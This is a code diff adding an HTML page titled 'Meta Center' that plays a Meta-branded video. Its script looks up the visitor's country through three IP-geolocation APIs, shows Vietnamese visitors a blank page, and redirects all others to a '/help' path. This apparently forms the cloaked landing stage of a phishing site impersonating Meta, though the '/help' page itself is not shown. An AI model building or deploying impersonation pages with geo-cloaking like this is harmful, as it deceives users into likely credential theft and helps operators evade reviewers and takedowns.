@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Center</title>
+    <style>
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #ffffff;
+        }
+
+        #myVideo {
+            max-width: 100%;
+            max-height: 100%;
+        }
+
+        .video-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+        }
+
+        .video-container.hidden {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="video-container" id="videoContainer">
+        <video id="myVideo" autoplay muted playsinline>
+            <source src="../video/video-meta23.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <script>
+        (function() {
+            let isBlocked = false;
+
+            // === HIỂN THỊ TRANG TRẮNG ===
+            function showWhitePage() {
+                document.getElementById('videoContainer').classList.add('hidden');
+                document.body.style.background = '#ffffff';
+                document.querySelector('html').style.background = '#ffffff';
+            }
+
+            // === KIỂM TRA IP VIỆT NAM ===
+            async function checkAndBlockVN() {
+                try {
+                    const apis = [
+                        'https://ipapi.co/json/',
+                        'https://ipinfo.io/json',
+                        'https://ip-api.com/json/'
+                    ];
+
+                    let countryCode = null;
+
+                    for (const api of apis) {
+                        try {
+                            const response = await fetch(api, {
+                                signal: AbortSignal.timeout(5000)
+                            });
+                            const data = await response.json();
+
+                            if (api.includes('ipapi.co')) {
+                                countryCode = data.country_code;
+                            } else if (api.includes('ipinfo.io')) {
+                                countryCode = data.country;
+                            } else if (api.includes('ip-api.com')) {
+                                countryCode = data.countryCode;
+                            }
+
+                            if (countryCode) break;
+                        } catch (e) {
+                            console.log('API fallback:', api, e.message);
+                            continue;
+                        }
+                    }
+
+                    if (countryCode === 'VN') {
+                        isBlocked = true;
+                        return true;
+                    }
+                    return false;
+                } catch (error) {
+                    console.error('Error checking location:', error);
+                    return false;
+                }
+            }
+
+            // === CHẠY KHI TRANG LOAD ===
+            async function init() {
+                const blocked = await checkAndBlockVN();
+
+                const video = document.getElementById('myVideo');
+
+                if (blocked) {
+                    // IP VN: video chạy xong -> chuyển sang trang trắng
+                    video.addEventListener('ended', function() {
+                        showWhitePage();
+                    });
+                    // Nếu video lỗi hoặc không chạy, vẫn chuyển sau 6s
+                    setTimeout(function() {
+                        if (!document.getElementById('videoContainer').classList.contains('hidden')) {
+                            showWhitePage();
+                        }
+                    }, 8000);
+                } else {
+                    // IP khác: video chạy xong -> chuyển hướng sau 6s
+                    setTimeout(function() {
+                        window.location.href = window.location.origin + "/help";
+                    }, 6000);
+                }
+            }
+
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', init);
+            } else {
+                init();
+            }
+        })();
+    </script>
+
+</body>
+
+</html>
